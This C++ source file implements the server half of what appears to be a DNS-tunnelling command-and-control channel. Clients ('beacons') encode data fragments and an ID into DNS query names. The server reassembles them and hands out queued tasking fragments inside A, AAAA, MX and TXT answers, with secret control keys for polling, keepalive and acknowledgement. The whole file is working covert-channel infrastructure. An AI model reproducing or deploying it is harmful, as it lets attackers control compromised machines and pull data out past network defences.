#include <iostream>
#include <cstring>

#include <algorithm>
#include <chrono>
#include <cctype>
#include <string_view>

#include <errno.h>

#include "server.hpp"
#include "debugLog.hpp"

#ifdef _WIN32
#pragma comment(lib, "ws2_32.lib")
#include <winsock2.h>
#include <ws2tcpip.h>
#else
#include <unistd.h>
#endif

namespace
{
std::string endpointToString(const sockaddr_in& addr)
{
    char buffer[INET_ADDRSTRLEN] = {0};
#ifdef _WIN32
    if (InetNtopA(AF_INET, const_cast<in_addr*>(&addr.sin_addr), buffer, INET_ADDRSTRLEN) == nullptr)
        return std::string("<invalid>");
#else
    if (inet_ntop(AF_INET, &(addr.sin_addr), buffer, sizeof(buffer)) == nullptr)
        return std::string("<invalid>");
#endif
    return std::string(buffer) + ":" + std::to_string(ntohs(addr.sin_port));
}
}

using namespace std;
using namespace dns;


Server::Server(int port, const std::string& domainToResolve)
: Dns(domainToResolve, "")
, m_port(port)
{
    dns::debug::log("Server",
                    "Constructed for domain '" + m_domainToResolve +
                        "' on port " + std::to_string(m_port));
}


Server::~Server()
{
    stop();
}


void Server::stop()
{
    if (m_isStoped)
    {
        dns::debug::log("Server::stop",
                        "Stop requested but server already stopped");
        return;
    }
    dns::debug::log("Server::stop",
                    "Stopping server on port " + std::to_string(m_port));
    m_isStoped=true;
    // Send an empty datagram to unblock recvfrom
    struct sockaddr_in addr = m_address;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    char byte = 0;
    sendto(m_sockfd, &byte, 1, 0, (struct sockaddr*)&addr, sizeof(addr));
    dns::debug::log("Server::stop", "Sent loopback datagram to unblock recvfrom");
    if(m_dnsServ && m_dnsServ->joinable())
    {
        dns::debug::log("Server::stop", "Joining worker thread");
        m_dnsServ->join();
    }
#ifdef __linux__
    close(m_sockfd);
#elif _WIN32
    closesocket(m_sockfd);
    WSACleanup();
#endif
    dns::debug::log("Server::stop", "Socket closed");
}


void Server::launch()
{
#ifdef _WIN32
    WSADATA wsa{};
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0)
    {
        std::cerr << "[dns::Server] WSAStartup failed\n";
        return;
    }
#endif

    dns::debug::log("Server::launch",
                    "Launching server for domain '" + m_domainToResolve +
                        "' on port " + std::to_string(m_port));

    m_isStoped=false;
    m_sockfd = socket(AF_INET, SOCK_DGRAM, 0);

    if(m_sockfd < 0)
    {
        dns::debug::log("Server::launch",
                        "socket() failed: " + std::string(strerror(errno)));
        m_isStoped = true;
#ifdef _WIN32
        WSACleanup();
#endif
        return;
    }

    dns::debug::log("Server::launch", "Socket created (fd=" +
                                         std::to_string(m_sockfd) + ")");

    m_address.sin_family = AF_INET;
    m_address.sin_addr.s_addr = INADDR_ANY;
    m_address.sin_port = htons(m_port);

    int rbind = bind(m_sockfd, (struct sockaddr *) & m_address, sizeof(struct sockaddr_in));
    if (rbind != 0)
    {
        string text("Could not bind: ");
        text += strerror(errno);

        dns::debug::log("Server::launch", text);

#ifdef _WIN32
        WSACleanup();
#endif

        return;
    }

    dns::debug::log("Server::launch",
                    "Socket bound to port " + std::to_string(m_port));

    this->m_dnsServ = std::make_unique<std::thread>(&Server::run, this);
    dns::debug::log("Server::launch", "Worker thread started");
}


/**
 * @brief Process queued QNAMEs and return the first complete reassembled message.
 *
 * This function is used on the server side to process DNS query names (QNAMEs)
 * that were previously received and stored in `m_qnameReceived` by the worker loop.
 * It extracts message fragments, associates them with client IDs, and then
 * reassembles complete messages.
 *
 * Steps:
 *   1. Acquire the mutex and move all queued QNAMEs into a local vector
 *      (`qnameTmp`), then clear the shared queue. Unlock the mutex early
 *      so other threads can continue appending new QNAMEs.
 *   2. Log the number of QNAMEs to process if any are present.
 *   3. For each QNAME:
 *        - Strip off the configured domain (`m_domainToResolve`),
 *          leaving only the "data.clientId" prefix.
 *        - Find the last dot:
 *            * everything before it is considered the `data` (the message fragment),
 *            * everything after it is considered the `clientId`.
 *        - Log domain, raw QNAME, extracted data, and clientId.
 *        - If both data and clientId are non-empty, call handleDataReceived()
 *          to parse and accumulate the fragment for that client.
 *   4. After processing all QNAMEs, call getMsg() to retrieve the first
 *      fully reassembled message (if any).
 *   5. Return the pair {clientId, msg}.
 *
 * @return std::pair<std::string, std::string>
 *         - clientId: The identifier of the client whose message was completed.
 *         - msg:      The full reconstructed message payload, or empty if none complete.
 *
 * @note
 * - On the client side, this logic is not needed since handleResponse()
 *   is called directly for each response, so `m_qnameReceived` is unused.
 * - QNAMEs are expected in the form: `data.id.domain`.
 * - Only the first complete message (if any) is returned; additional
 *   complete messages remain in the reassembly buffer until requested.
 */
std::pair<std::string, std::string> Server::getAvailableMessage()
{
    std::unique_lock<std::mutex> lock(m_mutex);

    std::vector<std::string> qnameTmp = m_qnameReceived;
    m_qnameReceived.clear();

    lock.unlock();

    if(qnameTmp.size()>0)
        dns::debug::log(
            "Server::getAvailableMessage",
            "Processing " +
                std::to_string(static_cast<unsigned long long>(qnameTmp.size())) +
                " queued QNAME(s)");

    for(int i=0; i<qnameTmp.size(); i++)
    {

        dns::debug::log(
            "Server::getAvailableMessage",
            "Processing " +
            qnameTmp[i] +
                " queued QNAME(s)");

        //data.id.domain
        std::string prefix = qnameTmp[i].substr(0, qnameTmp[i].size() - m_domainToResolve.size() -1);
        auto lastDot = prefix.rfind('.');

        std::string data;
        std::string clientId;

        if (lastDot != std::string::npos) 
        {
            data = prefix.substr(0, lastDot);          // "test1.test2.test3"
            clientId = prefix.substr(lastDot + 1);      // "id"
        } 

        dns::debug::log("Server::getAvailableMessage", "m_domainToResolve '" + m_domainToResolve + "'");
        dns::debug::log("Server::getAvailableMessage", "qName '" + qnameTmp[i] + "'");
        dns::debug::log("Server::getAvailableMessage", "data '" + data + "'");
        dns::debug::log("Server::getAvailableMessage", "clientId '" + clientId + "'");

        if(!data.empty() && !clientId.empty()) 
            handleDataReceived(data, clientId);
    }

    auto [clientId, msg] = getMsg();

    return {clientId, msg};
}


void Server::setMessageToSend(const std::string& msg, const std::string& clientId)
{
    setMsg(msg, clientId);
}

/**
 * @brief Main worker loop of the DNS server.
 *
 * This function runs in a loop until `m_isStoped` is set, continuously
 * receiving DNS queries from clients, decoding them, preparing responses,
 * and sending replies back.
 *
 * Steps:
 *   1. Wait for an incoming UDP datagram using recvfrom().
 *      - If recvfrom() returns <= 0 and the server is stopping, exit the loop.
 *      - If recvfrom() returns <= 0 but the server is not stopping, continue
 *        waiting.
 *   2. Convert the client address into a string for logging.
 *   3. Decode the received buffer into a Query object and log its metadata
 *      (ID, qname, qtype, qclass).
 *   4. Store the qname in m_qnameReceived (used later to reassemble complete
 *      messages).
 *   5. Construct a Response object and call prepareResponse() to build the
 *      DNS reply based on the incoming query.
 *      - TODO: add validation to ensure data is only sent to the correct
 *        beacon / client identity.
 *   6. Serialize the Response into the buffer and log its size and RDATA length.
 *   7. Send the response back to the client using sendto(), and log the number
 *      of bytes sent along with timing information.
 *   8. Loop repeats until m_isStoped is true.
 *
 * @note
 * - This loop processes all incoming queries synchronously on the thread
 *   that calls run().
 * - Currently, the client address is only logged but not used for session
 *   handling; depending on the design, this might need to be tied to client
 *   sessions for correctness.
 * - m_qnameReceived accumulates all qnames seen, which are later processed
 *   to reconstruct higher-level messages.
 *
 * Logging:
 * - Detailed debug logs are emitted for receive timings, query decoding,
 *   response preparation, and send timings.
 */

void Server::run()
{
    char buffer[BUFFER_SIZE];
    struct sockaddr_in clientAddress;
    socklen_t addrLen = sizeof (struct sockaddr_in);

    dns::debug::log("Server::run", "Worker loop started");

    while(!m_isStoped)
    {
        // wait to reveive a message
        auto waitStart = std::chrono::steady_clock::now();
        int nbytes = recvfrom(m_sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr *) &clientAddress, &addrLen);
        auto afterRecv = std::chrono::steady_clock::now();

        if(nbytes <= 0)
        {
            if(m_isStoped)
            {
                dns::debug::log("Server::run",
                                "recvfrom() returned " + std::to_string(nbytes) +
                                    " while stopping");
                break;
            }

            dns::debug::log("Server::run",
                            "recvfrom() returned " + std::to_string(nbytes) +
                                ", continuing");
            continue;
        }

        // client address only used for logging for the moment, do I need to use to handle sessions ??
        std::string clientEndpoint = endpointToString(clientAddress);
        dns::debug::log(
            "Server::run",
            "Received " + std::to_string(nbytes) + " bytes from " +
                clientEndpoint + " after " +
                dns::debug::formatDuration(afterRecv - waitStart));

        // all messages are part of the final payload that need to be put together
        // decode extract the data using decode_qname
        Query query;
        query.decode(buffer, nbytes);

        std::string qname = query.getQName();

        dns::debug::log(
            "Server::run",
            "Decoded query id=" + std::to_string(query.getID()) + " qname='" +
                qname + "' qtype=" + std::to_string(query.getQType()) +
                " qclass=" + std::to_string(query.getQClass()));


        // add the qname received to a list that will be put togheter after to form a message
        {
            std::lock_guard<std::mutex> lock(m_mutex);
            m_qnameReceived.push_back(qname);
        }

        Response response;
        auto handleStart = std::chrono::steady_clock::now();

        // TODO put a mechnisme in place to validate that we send the data to the right beacon
        // check if message if for our domain and prepare a response independty from the identity of the querier ! 
        prepareResponse(query, response);
        
        auto afterHandle = std::chrono::steady_clock::now();

        size_t pendingQueues = 0;
        {
            std::lock_guard<std::mutex> lock(m_mutex);
            pendingQueues = m_msgQueue.size();
        }

        dns::debug::log(
            "Server::run",
            "prepareResponse completed in " +
                dns::debug::formatDuration(afterHandle - handleStart) +
                "; outbound fragment queue size=" +
                std::to_string(static_cast<unsigned long long>(pendingQueues)));

        memset(buffer, 0, BUFFER_SIZE);
        nbytes = response.code(buffer);

        dns::debug::log(
            "Server::run",
            "Encoded response of " + std::to_string(nbytes) +
                " bytes with RDATA length=" +
                std::to_string(
                    static_cast<unsigned long long>(response.getRdata().size())));

        // send the reponse to the query
        auto beforeSend = std::chrono::steady_clock::now();
        int sent = sendto(m_sockfd, buffer, nbytes, 0, (struct sockaddr *) &clientAddress, addrLen);
        auto afterSend = std::chrono::steady_clock::now();

        dns::debug::log(
            "Server::run",
            "Sent " + std::to_string(sent) + " bytes to " + clientEndpoint +
                " in " +
                dns::debug::formatDuration(afterSend - beforeSend));
    }

    dns::debug::log("Server::run", "Worker loop terminated");
}

/**
 * @brief Build a DNS response based on the incoming query (qName, qType, etc.).
 *
 * This function inspects the received DNS query, determines the type of request,
 * and prepares the corresponding DNS response payload.
 *
 * Steps:
 *   1. Extract the QNAME from the query.
 *   2. If the QNAME ends with this server’s domain (`m_domainToResolve`):
 *        - Split the prefix into `data` (everything before the last dot)
 *          and `id` (the last label, representing the client ID).
 *        - Log extracted values for debugging.
 *        - Depending on the QNAME contents:
 *            * If it contains `m_secretKeyClientAskData`:
 *                - Call splitPacket() to prepare fragments for this client.
 *                - If fragments are queued in `m_msgQueue[id]`, dequeue one
 *                  fragment as the payload.
 *                - Otherwise, respond with `m_secretKeyServerNoData`.
 *            * If it contains `m_secretKeyClientKeepAlive`:
 *                - Respond with `m_secretKeyServerKeepAlive`.
 *            * Otherwise (client sent data or garbage):
 *                - Respond with `m_secretKeyAck`.
 *   3. If the QNAME is not in scope (doesn’t end with this domain),
 *      log the anomaly and leave `dataToSend` empty.
 *   4. Populate the `Response` object with:
 *        - Standard header fields (ID, flags, counts, TTL, etc.).
 *        - If `dataToSend` is empty, set RCODE = NameError (NXDOMAIN).
 *        - Otherwise, set RCODE = Ok, ANCOUNT = 1, and put the payload
 *          into RDATA formatted for the query’s QTYPE:
 *            * A     → enforce 4-byte hex (8 chars).
 *            * AAAA  → enforce 16-byte hex (32 chars).
 *            * MX    → raw string.
 *            * CNAME/NS/PTR/TXT/default → raw string.
 *
 * @param query     The incoming DNS query object (decoded from client packet).
 * @param response  The response object to populate and send back.
 *
 * @note
 * - The clientId is derived from the last label in the QNAME.
 * - The response payload is selected based on control keys embedded
 *   in the query or from queued message fragments.
 * - Logging provides visibility into parsing, queue state, and payloads.
 */

void Server::prepareResponse(const Query& query, Response& response)
{
    string qName = query.getQName();

    string dataToSend = "";
    if (endsWith(qName, m_domainToResolve))
    {
        //data1.data2.data3.id.domain
        std::string prefix = qName.substr(0, qName.size() - m_domainToResolve.size() -1);
        auto lastDot = prefix.rfind('.');

        

        std::string id;
        std::string data;
        if (lastDot != std::string::npos) 
        {
            data = prefix.substr(0, lastDot);          // "test1.test2.test3"
            id   = prefix.substr(lastDot + 1);         // "id"
        } 

        dns::debug::log("Server::prepareResponse", "m_domainToResolve '" + m_domainToResolve + "'");
        dns::debug::log("Server::prepareResponse", "qName '" + qName + "'");
        dns::debug::log("Server::prepareResponse", "data '" + data + "'");
        dns::debug::log("Server::prepareResponse", "id '" + id + "'");
       
        // ask data
        if(qName.contains(m_secretKeyClientAskData))
        {
            splitPacket(query.getQType(), id);

            // data available
            size_t remainingFragments = 0;
            {
                std::lock_guard<std::mutex> lock(m_mutex);
                auto& queue = m_msgQueue[id];
                if(!queue.empty())
                {
                    dataToSend = queue.front();
                    queue.pop();
                    remainingFragments = queue.size();
                }
            }

            if(!dataToSend.empty())
            {
                dns::debug::log(
                    "Server::prepareResponse",
                    "Using queued fragment for response; remaining fragments=" +
                        std::to_string(static_cast<unsigned long long>(
                            remainingFragments)) +
                        " payload='" + dataToSend + "'");
            }
            // no data
            else
            {
                dataToSend = m_secretKeyServerNoData;

                dns::debug::log("Server::prepareResponse", "No payload available; sending control domain '" + dataToSend + "'");
            }
        }
        // just say hello -> could be used to ID 
        else if(qName.contains(m_secretKeyClientKeepAlive))
        {
            dataToSend = m_secretKeyServerKeepAlive;

            dns::debug::log("Server::prepareResponse", "Client send KeepAlive '" + dataToSend + "'");
        }
        // shit or acutal data sent from actual beacon
        else
        {
            dataToSend = m_secretKeyAck;

            dns::debug::log("Server::prepareResponse", "Client sent data or parazit packet '" + dataToSend + "'");
        }
    }
    else
    {
        dns::debug::log("Server::prepareResponse", "Received unexptected qname '" + qName + "'");
    }

    response.setID(query.getID());
    response.setRecursionDesired(query.isRecursionDesired());
    response.setName(query.getQName());
    response.setType(query.getQType());
    response.setClass(query.getQClass());
    response.setTtl(0);
    response.setQdCount(1);
    response.setNsCount(0);
    response.setArCount(0);

    if (dataToSend.empty())
    {
        dns::debug::log("Server::prepareResponse", "Domain '" + qName + "' not in scope; sending NameError");

        response.clearAnswer();
        response.setAnCount(0);
        response.setRCode(Response::NameError);
    }
    else
    {
        dns::debug::log("Server::prepareResponse", "Responding with payload '" + dataToSend + "' (" + std::to_string(static_cast<unsigned long long>(dataToSend.size())) + " bytes)");

        response.setAnCount(1);
        response.setRCode(Response::Ok);
        response.setMxPreference(0);

        switch (query.getQType())
        {
            case 1: // A
            {
                std::string hex = dataToSend;
                if (hex.size() < 8)
                    hex.append(8 - hex.size(), '0');
                if (hex.size() > 8)
                    hex.resize(8);
                response.setRdata(hex);
                break;
            }
            case 28: // AAAA
            {
                std::string hex = dataToSend;
                if (hex.size() < 32)
                    hex.append(32 - hex.size(), '0');
                if (hex.size() > 32)
                    hex.resize(32);
                response.setRdata(hex);
                break;
            }
            case 15: // MX
                response.setRdata(dataToSend);
                break;
            case 5:  // CNAME
            case 2:  // NS
            case 12: // PTR
                response.setRdata(dataToSend);
                break;
            case 16: // TXT
            default:
                response.setRdata(dataToSend);
                break;
        }
    }
}



